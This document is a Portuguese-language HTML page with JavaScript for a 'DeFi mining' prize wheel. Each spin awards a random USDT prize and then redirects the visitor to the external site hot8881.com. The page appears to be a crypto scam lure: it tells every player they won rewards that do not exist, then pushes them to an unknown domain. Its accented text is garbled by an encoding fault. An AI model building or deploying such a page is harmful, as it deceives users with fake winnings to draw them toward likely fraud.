<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Defi mineraÃ§Ã£o sorteio da roda da sorte</title>
<style>
  body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
  #wheelcanvas { margin: 20px auto; display: block; }
  #spinbtn { padding: 15px 40px; font-size: 18px; background-color: #ff6600; border: none; color: white; border-radius: 5px; cursor: pointer; }
  #result { margin-top: 20px; font-size: 24px; font-weight: bold; }
</style>
</head>
<body>

<h1>Defi mineraÃ§Ã£o - Roda da Sorte</h1>
<canvas id="wheelcanvas" width="500" height="500"></canvas>
<br />
<button id="spinbtn">Girar a roda ðŸŽ‰</button>
<div id="result"></div>

<script>
const prizes = [
  "5 USDT de recompensa",
  "100 USDT de recompensa",
  "1000 USDT de recompensa",
  "Obrigado por participar",
  "ExperiÃªncia de mineraÃ§Ã£o por 3 dias",
  "ExperiÃªncia de mineraÃ§Ã£o por 30 dias"
];

const colors = ["#f44336", "#e91e63", "#9c27b0", "#2196f3", "#009688", "#ff9800"];

const canvas = document.getElementById("wheelcanvas");
const ctx = canvas.getContext("2d");
const centerX = canvas.width / 2;
const centerY = canvas.height / 2;
const radius = 200;
const segmentAngle = (2 * Math.PI) / prizes.length;

let currentAngle = 0;
let isSpinning = false;

function drawWheel(angle) {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  ctx.save();
  ctx.translate(centerX, centerY);
  ctx.rotate(angle);
  for (let i = 0; i < prizes.length; i++) {
    ctx.beginPath();
    ctx.fillStyle = colors[i];
    ctx.moveTo(0, 0);
    ctx.arc(0, 0, radius, i * segmentAngle, (i + 1) * segmentAngle);
    ctx.lineTo(0, 0);
    ctx.fill();

    ctx.fillStyle = "#fff";
    ctx.font = "16px Arial";
    ctx.textAlign = "right";
    ctx.textBaseline = "middle";
    ctx.save();
    ctx.rotate(i * segmentAngle + segmentAngle / 2);
    ctx.fillText(prizes[i], radius - 10, 0);
    ctx.restore();
  }
  ctx.restore();

  ctx.fillStyle = "black";
  ctx.beginPath();
  ctx.moveTo(centerX - 10, centerY - radius - 20);
  ctx.lineTo(centerX + 10, centerY - radius - 20);
  ctx.lineTo(centerX, centerY - radius - 5);
  ctx.closePath();
  ctx.fill();
}

function spin() {
  if (isSpinning) return;
  isSpinning = true;
  document.getElementById("result").textContent = "";
  const spins = Math.floor(Math.random() * 5) + 5;
  const randomIndex = Math.floor(Math.random() * prizes.length);
  const finalAngle = (2 * Math.PI) * spins + randomIndex * segmentAngle + segmentAngle / 2;

  let start = null;
  function animate(timestamp) {
    if (!start) start = timestamp;
    const elapsed = timestamp - start;
    const duration = 4000;
    if (elapsed < duration) {
      const progress = elapsed / duration;
      currentAngle = finalAngle * easeOut(progress);
      drawWheel(currentAngle);
      requestAnimationFrame(animate);
    } else {
      currentAngle = finalAngle;
      drawWheel(currentAngle);
      setTimeout(() => {
        const prize = prizes[randomIndex];
        document.getElementById("result").textContent = "ParabÃ©ns! VocÃª ganhou: " + prize;
        setTimeout(() => {
          window.location.href = "http://hot8881.com";
        }, 3000);
        isSpinning = false;
      }, 500);
    }
  }
  requestAnimationFrame(animate);
}

function easeOut(t) {
  return t * (2 - t);
}

drawWheel(0);

document.getElementById("spinbtn").addEventListener("click", spin);
</script>

</body>
</html>
